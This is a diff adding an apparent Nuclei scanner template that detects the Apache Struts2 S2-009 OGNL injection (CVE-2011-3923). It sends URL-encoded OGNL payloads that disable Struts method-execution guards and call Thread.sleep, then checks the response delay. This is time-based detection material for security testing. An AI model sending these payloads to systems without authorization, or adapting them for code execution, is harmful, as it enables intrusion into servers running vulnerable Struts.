@@ -1,0 +1,29 @@
+id: local-struts2-s2-009-math
+
+info:
+  name: Struts2 S2-009 OGNL Injection via Parameter Name Trick (CVE-2011-3923)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-009 (CVE-2011-3923) OGNL injection via parameter name evaluation trick.
+    The 'name' param holds an OGNL expression; 'z[(name)('meh')]=true' triggers evaluation.
+    Time-based detection: Thread.sleep(3000) causes 3+ second response delay confirming execution.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-009
+    - https://nvd.nist.gov/vuln/detail/CVE-2011-3923
+  tags: safe-poc,struts2,s2-009,cve,cve2011,ognl,rce,time-based
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ajax/example5.action?age=1&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dnew+java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]%3Dnew+java.lang.Boolean(true),%40java.lang.Thread%40sleep(3000))(meh)&z[%28name%29%28%27meh%27%29]=true"
+      - "{{BaseURL}}/ajax/example5?age=1&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dnew+java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]%3Dnew+java.lang.Boolean(true),%40java.lang.Thread%40sleep(3000))(meh)&z[%28name%29%28%27meh%27%29]=true"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 3"
+      - type: status
+        status:
+          - 200
